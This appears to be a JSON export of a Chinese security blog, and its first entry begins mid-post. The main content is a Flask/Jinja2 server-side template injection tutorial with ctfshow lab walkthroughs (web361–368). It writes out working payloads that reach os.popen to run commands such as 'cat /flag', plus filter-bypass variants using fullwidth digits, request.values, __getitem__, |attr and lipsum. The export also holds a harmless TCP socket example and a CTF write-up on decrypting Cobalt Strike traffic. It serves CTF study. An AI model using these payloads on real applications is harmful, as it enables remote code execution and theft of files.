class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">print(f.__class__.__mro__)</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231205151555259.png\" alt=\"\"></p>\n<p>再和数组一样跟上下标来选择自己需要的父类在这里 object 就是 3，因此</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">print(f.__class__.__mro__[3])</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231205151708060.png\" alt=\"\"></p>\n<p>到这里为止，我们拿到了 object 类，自然是可以查找到 object 类中的所有子类，来选取可以利用的子类进行 rce。使用 subclasses 魔术方法来列出当前所在类的所有子类</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">print(f.__class__.__mro__[3].__subclasses__())</span><br></pre></td></tr></table></figure>\n<p>同样通过下标来选择需要用到的子类，这里用到 &lt; class<br>\n‘os._wrap_close’&gt;，在我这是 139</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">print(f.__class__.__mro__[3].__subclasses__()[139])</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231205152724475.png\" alt=\"\"></p>\n<p>成功拿到 os 子类，接下来使用魔术方法 init 进行一下初始化</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">print(f.__class__.__mro__[3].__subclasses__()[139].__init__)</span><br></pre></td></tr></table></figure>\n<p>接着使用魔术方法 globals 获取 function 所处空间下可使用的 module、方法以及所有变量</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">print(f.__class__.__mro__[3].__subclasses__()[139].__init__.__globals__)</span><br></pre></td></tr></table></figure>\n<p>接着用 read 来读取子进程的输出</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">print(f.__class__.__mro__[3].__subclasses__()[139].__init__.__globals__[&#x27;popen&#x27;](&#x27;ls&#x27;).read())</span><br></pre></td></tr></table></figure>\n<p>这样就是一条完整的注入 payload 了，进行了远程 rce，执行了 ls 命令</p>\n<p><strong>总结：简单来说，就是在接收用户输入时没有做好安全过滤，导致在模板渲染时执行了用户的恶意输入，造成了注入漏洞。而我们利用这一漏洞使用魔术方法调回 object 类，并使用它的可执行的子类来进行 rce</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__class__   ：返回类型所属的对象</span><br><span class=\"line\"></span><br><span class=\"line\">__mro__     ：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class=\"line\"></span><br><span class=\"line\">__base__   ：返回该对象所继承的父类</span><br><span class=\"line\"></span><br><span class=\"line\">__mro__     ：返回该对象的所有父类</span><br><span class=\"line\"></span><br><span class=\"line\">__subclasses__()  获取当前类的所有子类</span><br><span class=\"line\"></span><br><span class=\"line\">__init__  类的初始化方法</span><br><span class=\"line\"></span><br><span class=\"line\">__globals__  获取function所处空间下可使用的module、方法以及所有变量</span><br></pre></td></tr></table></figure>\n<h2 id=\"实例\"><a class=\"markdownIt-Anchor\" href=\"#实例\">#</a> 实例</h2>\n<p>既然了解了漏洞原理和注入方法，那接下来就来进行实操，以下实例均来自 ctfshow 的 web 入门靶场</p>\n<h3 id=\"web361\"><a class=\"markdownIt-Anchor\" href=\"#web361\">#</a> web361</h3>\n<p>利用 name 进行 get 传参，先尝试一下漏洞是否存在，能不能被正常执行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;7\\*7&#125;&#125;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231205160528509.png\" alt=\"\"></p>\n<p>成功，接下来根据之前的流程来进行 rce，先用 mro 列出所有父类</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?name=&#123;&#123;&quot;&quot;.__class__.__mro__&#125;&#125;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231205160730810.png\" alt=\"\"></p>\n<p>发现标号 1 即可返回到 object 类</p>\n<p>接着列出所有子类</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?name=&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231205160840957.png\" alt=\"\"></p>\n<p>找到 &lt;class ‘os._wrap_close’&gt; 大概在 132 左右</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?name=&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[132]&#125;&#125;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231205160911199.png\" alt=\"\"></p>\n<p>初始化并利用进行 rce</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?name=&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;ls /&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231205161244100.png\" alt=\"\"></p>\n<p>根目录下存在 flag，改变命令为 cat /flag 即可</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?name=&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat /flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>总结：本题没有进行任何过滤，因此只要找到环境中的 object 的类、子类以及方法和变量所在的位置就可以</strong></p>\n<h3 id=\"web362\"><a class=\"markdownIt-Anchor\" href=\"#web362\">#</a> web362</h3>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231205162107943.png\" alt=\"\"></p>\n<p>用 361 的 payload 发现打不通了，应该是过滤了一些东西，进一步进行排查</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231205162304412.png\" alt=\"\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231205162318642.png\" alt=\"\"></p>\n<p>发现是其中的 2、3 数字被过滤了，很简单，利用全角数字代替正常数字，效果是一样的，进行过滤绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?name=&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[１３２].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat /flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>总结：本题过滤了数字，但只要使用同样能被执行的类型就可以实现绕过</strong></p>\n<h3 id=\"web363\"><a class=\"markdownIt-Anchor\" href=\"#web363\">#</a> web363</h3>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231205194231943.png\" alt=\"\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231205194302538.png\" alt=\"\"></p>\n<p>经过尝试可以发现，本题中单引号双引号都被过滤了，用 [] 进行代替</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231205194547828.png\" alt=\"\"></p>\n<p>那么问题来了，按照原先的 payload 后面的 popen 和 ls 也需要单引号的包裹才能实现 rce，但这里明显行不通，只能换一种方法</p>\n<p>利用传参的方式将引号包裹的参数传递进去：request.args.a</p>\n<p>构造 payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?name=&#123;&#123;[].__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[request.args.a](request.args.b).read()&#125;&#125;&amp;a=popen&amp;b=ls</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231206131731543.png\" alt=\"\"></p>\n<p>成功绕过，读取 flag</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?name=&#123;&#123;[].__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[request.args.a](request.args.b).read()&#125;&#125;&amp;a=popen&amp;b=cat /flag</span><br></pre></td></tr></table></figure>\n<p><strong>总结：本题过滤了单引号，导致普通的 globals 跟上 popen 的方法使用不了，于是利用了传参的方法将单引号内包裹的内容进行传入实现绕过</strong></p>\n<h3 id=\"web364\"><a class=\"markdownIt-Anchor\" href=\"#web364\">#</a> web364</h3>\n<p>用上一题的 payload 是打不通了，经尝试发现是 args 被 ban 了，但传参的方法依然是可以使用的，将 args 替换成 values 能实现同样的效果</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?name=&#123;&#123;[].__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[request.values.a](request.values.b).read()&#125;&#125;&amp;a=popen&amp;b=cat /flag</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231206132402520.png\" alt=\"\"></p>\n<p>成功绕过拿到 flag</p>\n<p><strong>总结：本题相比上一题就把 args<br>\nban 了，替换成 values 能实现同样的效果，成功绕过</strong></p>\n<h3 id=\"web365\"><a class=\"markdownIt-Anchor\" href=\"#web365\">#</a> web365</h3>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231206133334887.png\" alt=\"\"></p>\n<p>一开始使用 class 魔术方法时就发现中括号被增加过滤了，对象可以使用 () 等字符来代替，但是后面的 subclasses 等魔术方法都需要中括号来选择下标，这里使用<strong> getitem</strong> () 方法来代替 [] 实现绕过。</p>\n<p>使用方法举例：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">前：.__subclasses__()[132]</span><br><span class=\"line\"></span><br><span class=\"line\">后：.__subclasses__().__getitem__(132)</span><br></pre></td></tr></table></figure>\n<p>能实现和中括号相同的效果，这里使用<strong> getitem</strong> () 方法来进行绕过试试（其实就是用<strong> getitem</strong> () 方法来代替 payload 中的所有 []）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?name=&#123;&#123;().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(132).__init__.__globals__.__getitem__(request.values.a)(request.values.b).read()&#125;&#125;&amp;a=popen&amp;b=ls</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231206134805952.png\" alt=\"\"></p>\n<p>成功绕过，读取 flag</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?name=&#123;&#123;().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(132).__init__.__globals__.__getitem__(request.values.a)(request.values.b).read()&#125;&#125;&amp;a=popen&amp;b=cat /flag</span><br></pre></td></tr></table></figure>\n<p><strong>总结：本题增加过滤了中括号，利用 getitem () 方法来代替中括号实现绕过</strong></p>\n<h3 id=\"web366\"><a class=\"markdownIt-Anchor\" href=\"#web366\">#</a> web366</h3>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231206140444508.png\" alt=\"\"></p>\n<p>发现下划线被过滤了，那么同样需要使用传参的方法去传递<strong> class</strong> () 等魔术方法来实现对下划线的绕过，这里需要用 | attr () 来代替原先的。的写法</p>\n<p>例如：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">().__class__</span><br><span class=\"line\"></span><br><span class=\"line\">()|attr(&quot;__class__&quot;)</span><br></pre></td></tr></table></figure>\n<p>这两种方法所实现的效果是一样的，这里被过滤了下划线，因此利用传参的方法来构造 payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;()|attr(request.values.a)&#125;&#125;&amp;a=__class__</span><br></pre></td></tr></table></figure>\n<p>完整 payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?name=&#123;&#123;(()|attr(request.values.a)|attr(request.values.b)|attr(request.values.c)()|attr(request.values.d)(132)|attr(request.values.e)|attr(request.values.f)|attr(request.values.g)(request.values.h)(request.values.i)).read()&#125;&#125;&amp;a=__class__&amp;b=__base__&amp;c=__subclasses__&amp;d=__getitem__&amp;e=__init__&amp;f=__globals__&amp;g=__getitem__&amp;h=popen&amp;i=cat /flag</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231206144623859.png\" alt=\"\"></p>\n<p>成功绕过，但是这样的 payload 比较冗长，检查起来也比较麻烦，所以想办法精简一下</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231206144819010.png\" alt=\"\"></p>\n<p>这里可以使用 lipsum 方法，跟上 globals 魔术方法能实现直接调用 os 执行命令的功能</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231206145221279.png\" alt=\"\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?name=&#123;&#123;lipsum.__globals__.os.popen(&#x27;cat /flag&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>\n<p>修改后 pyaload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?name=&#123;&#123;(lipsum|attr(request.values.a)).os.popen(request.values.b).read()&#125;&#125;&amp;a=__globals__&amp;b=cat /flag</span><br></pre></td></tr></table></figure>\n<p>成功绕过获得 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231206150900872.png\" alt=\"\"></p>\n<p><strong>总结：本题 ban 了下划线，那么同样需要用传参的方式传入魔术方法，用 | attr (“class”) 来等效替代了原先的.class 并同样使用 request 进行传入，这样导致 payload 十分冗长，于是利用 lipsum 跟上 globals 直接执行 os 来缩短 payload 的长度</strong></p>\n<h3 id=\"web367\"><a class=\"markdownIt-Anchor\" href=\"#web367\">#</a> web367</h3>\n<p>发现 os 被过滤了，同样传参进去进行绕过，这里需要使用 get 方法</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?name=&#123;&#123;(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()&#125;&#125;&amp;a=__globals__&amp;b=os&amp;c=cat /flag</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231206154410790.png\" alt=\"\"></p>\n<p><strong>总结：os 被增加过滤，使用 get 方法进行传参传入绕过限制</strong></p>\n<h3 id=\"web368\"><a class=\"markdownIt-Anchor\" href=\"#web368\">#</a> web368</h3>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231206155937380.png\" alt=\"\"></p>\n<p>这次发现连花括号都直接过滤了，使用以下方法进行包裹绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% print() %&#125;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231206155135055.png\" alt=\"\"></p>\n<p>将 367 中的 payload 修改一下，用上述绕过方法进行包裹</p>\n<p>payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?name=&#123;% print((lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()) %&#125;&amp;a=__globals__&amp;b=os&amp;c=cat /flag</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231206155240331.png\" alt=\"\"></p>\n<p>成功绕过</p>\n<p><strong>总结：过滤了花括号，使用其他方式进行包裹绕过</strong></p>\n",
            "tags": [
                "WEB"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/Socket%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/",
            "url": "https://nnnpc.github.io/2024/04/16/Socket%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/",
            "title": "Socket网络编程",
            "date_published": "2024-04-16T05:58:19.031Z",
            "content_html": "<blockquote>\n<p>Socket 是计算机之间进行网络通信的一套程序接口，相当于在发送端和接收端之间建立了一个通信管道。在实际应用中，一些远程管理软件和网络安全软件大多依赖于 Socket 来实现特定功能，由于 TCP（Transmission<br>\nControl<br>\nProtocol，传输控制协议）方式在网络编程中应用得非常频繁，此处将对 TCP 编程进行讲解并给出具体应用实例<br>\n编写 TCP 时一般会用到的 Socket 模块，其方法主要包括：</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">connect(address)：连接远程计算机</span><br><span class=\"line\">send(bytes[,flags])：发送数据</span><br><span class=\"line\">recv(bufsize[,flags])：接收数据</span><br><span class=\"line\">bind(address)：绑定地址</span><br><span class=\"line\">listen(backlog)：开始监听，等待客户端连接</span><br><span class=\"line\">accept()：响应客户端的一个请求，接受一个连接</span><br></pre></td></tr></table></figure>\n<p>使用 TCP 进行通信，首先需要的是在客户端和服务端之间建立连接，并且要在通信结束后关闭连接以释放资源。由于 TCP 是面向连接的，因此相对于 UDP 来说能提供更高的可靠性。<br>\n用示例展示如何通过 TCP 进行通信：</p>\n<blockquote>\n<p>设计一个对话系统 &quot;小艾&quot;。该应用分为两部分，一部分为服务端，另一部分为客户端。客户端发送请求信息，服务端返回应答信息。</p>\n</blockquote>\n<p><strong>1. 服务端代码（<span class=\"exturl\" data-url=\"aHR0cDovL3NlcnZlci5weQ==\">server.py</span>）：</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import socket</span><br><span class=\"line\"></span><br><span class=\"line\">language = &#123;&#x27;what is your name:&#x27;:&#x27;I am Tom&#x27;,&#x27;how old are you?&#x27;:&#x27;25&#x27;,&#x27;bye&#x27;:&#x27;bye!&#x27;&#125;</span><br><span class=\"line\">HOST = &quot;127.0.0.1&quot;</span><br><span class=\"line\">PORT = 6666</span><br><span class=\"line\">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class=\"line\">s.bind((HOST,PORT))</span><br><span class=\"line\">s.listen(1)</span><br><span class=\"line\">print(&quot;Listing at port 6666&quot;)</span><br><span class=\"line\">conn,addr = s.accept()</span><br><span class=\"line\">print(&quot;connect by:&quot;,addr)</span><br><span class=\"line\">while True:</span><br><span class=\"line\">    data = conn.recv(1024)</span><br><span class=\"line\">    data = data.decode()</span><br><span class=\"line\">    if not data:</span><br><span class=\"line\">        break</span><br><span class=\"line\">    print(&#x27;received message:&#x27;,data)</span><br><span class=\"line\">    conn.sendall(language.get(data,&#x27;Nothing&#x27;).encode())</span><br><span class=\"line\">conn.close()</span><br><span class=\"line\">s.close()</span><br></pre></td></tr></table></figure>\n<p><strong>2. 客户端代码（<span class=\"exturl\" data-url=\"aHR0cDovL2NsaWVudC5weQ==\">client.py</span>）：</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import socket,sys</span><br><span class=\"line\">host = &quot;127.0.0.1&quot;</span><br><span class=\"line\">port = 6666</span><br><span class=\"line\">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\">try:</span><br><span class=\"line\">    s.connect((host,port))</span><br><span class=\"line\">except Exception as e:</span><br><span class=\"line\">    sys.exit()</span><br><span class=\"line\">while True:</span><br><span class=\"line\">    c = input(&quot;YOU SAY:&quot;)</span><br><span class=\"line\">    s.sendall(c.encode())</span><br><span class=\"line\">    data = s.recv(1024)</span><br><span class=\"line\">    data = data.decode()</span><br><span class=\"line\">    print(&#x27;Recived:&#x27;, data)</span><br><span class=\"line\">    if c.lower() == &#x27;再见&#x27;:</span><br><span class=\"line\">        break</span><br><span class=\"line\">s.close()</span><br></pre></td></tr></table></figure>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3huLS1zZXJ2ZXItOW83aXltdTRjc2E3MjlmeW1hOTVyMXRidDc1ZHZoM2gueG4tLXB5Y2xpZW50LTBjMm4ucHk=\">将以上代码分别命名为 server.py 和 client.py</span>，在 cmd 窗口运行服务端程序，服务端开始进行监听；启动一个新的 cmd 窗口并运行客户端程序，服务端程序提示连接已建立；在客户端输入要发送的信息，服务端会根据提前建立的字典自动进行回复<br>\n效果图：</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/dm9eyFiA0r6OHqQy.png!thumbnail\" alt=\"\"></p>\n<p>在运行客户端代码后，服务端会显示已连接 ip 和端口，并且会显示出接收的语句，当输入 &quot;再见&quot; 时，服务端和客户端会同时断开，是因为 client.py 中 while 循环中的 if 语句，当输入再见时会执行 break 语句跳出循环，并执行 s.close () 关闭程序，从而与服务端断开连接，服务端也就断开了</p>\n",
            "tags": [
                "python"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/SICTF%20%E6%B5%81%E9%87%8F%E9%A2%98wp/",
            "url": "https://nnnpc.github.io/2024/04/16/SICTF%20%E6%B5%81%E9%87%8F%E9%A2%98wp/",
            "title": "SICTF 流量题wp",
            "date_published": "2024-04-16T05:58:19.029Z",
            "content_html": "<p>这次比赛出了三道流量题，一道 cs，一道冰蝎，一道二者结合的题目，第一次出这类的流量题所以很多东西没有研究的很深，出题思路可能经不起深究，欢迎各位师傅的交流与讨论</p>\n<p>接下来看看题目</p>\n<h1 id=\"一起上号不\"><a class=\"markdownIt-Anchor\" href=\"#一起上号不\">#</a> 一起上号不</h1>\n<p>这题也是因为该流量所使用的工具命名的，cobalt<br>\nstrike 是一个可多人协作的渗透工具</p>\n<p>这个工具的流量特征其实挺明显的</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/75KfXS2Ztg0dceCW.png!thumbnail\" alt=\"\"></p>\n<p>过滤一下 http 流可以发现是 131 和 144 两台机子之间的通信</p>\n<p>在本题中，可以看到流量包尾有一个 key.zip，导出 http 对象之后使用脚本提取出 private<br>\nkey</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1NsemR1ZGUvY3Mtc2NyaXB0cw==\">https://github.com/Slzdude/cs-scripts</span></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/TZYi4LLl4NOyrnyh.png!thumbnail\" alt=\"\"></p>\n<p>根据 cs 的工作流程可知，如果需要解密出通信的流量，得先知道协商密钥，而协商密钥和主机信息被使用 rsa 公钥加密之后放在了心跳包的 cookie 中</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/UvzyhPD4ruTKps7E.png!thumbnail\" alt=\"\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">U8jm3+oqzYLuUiRd9F3s7xVz7fGnHQYIKF9ch6GRseWfcBSSk+aGhWP3ZUyHIkwRo1/oDCcKV7LYAp022rCm9bC7niOgMlsvgLRolMKIz+Eq5hCyQ0QVScH8jDYsJsCyVw1iaTf5a7gHixIDrSbTp/GiPQIwcTNZBXIJrll540s=</span><br></pre></td></tr></table></figure>\n<p>利用私钥解密该 cookie<br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1dCR2xJbC9DU19EZWNyeXB0\">https://github.com/WBGlIl/CS_Decrypt</span></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/52cKG63Uys3inOuh.png!thumbnail\" alt=\"\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/2G1zSIgrSoX6i3cf.png!thumbnail\" alt=\"\"></p>\n<p>得到：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">AES key:ef08974c0b06bd5127e04ceffe12597b</span><br><span class=\"line\">HMAC key:bd87fa356596a38ac3e3bb0b6c3496e9</span><br></pre></td></tr></table></figure>\n<p>拿着 key 就可以去解密通信流量了<br>\n这里过滤 http 可以清楚的看到</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/bECvOauc7bVO3lHC.png!thumbnail\" alt=\"\"></p>\n<p>第一个框心跳包的发送，发现有命令需要执行之后，teamserver 加密了数据包，并且作为返回包返回，body 部分包含命令，经过被控端的解码执行操作后，通过 POST 请求将加密的数据包发送回 teamserver，body 部分包含了命令执行的结果</p>\n<p>因此，我们去拿 data 数据进行解密分析，根据脚本的要求，将 data 块进行编码操作之后放入脚本中</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/9xKvvG5BmCDga5d8.png!thumbnail\" alt=\"\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ssDN9pRf019VyeRe.png!thumbnail\" alt=\"\"></p>\n<p>修改对应的值之后成功看到命令执行的回显内容，项目中还有一个脚本 CS_Task_AES_Decrypt.py 是解密执行的命令的，也就是心跳包的返回包，可以去尝试一下，但是本题用不到，最后能在第三个命令执行结果的请求包中解密获得 flag</p>\n<p><img 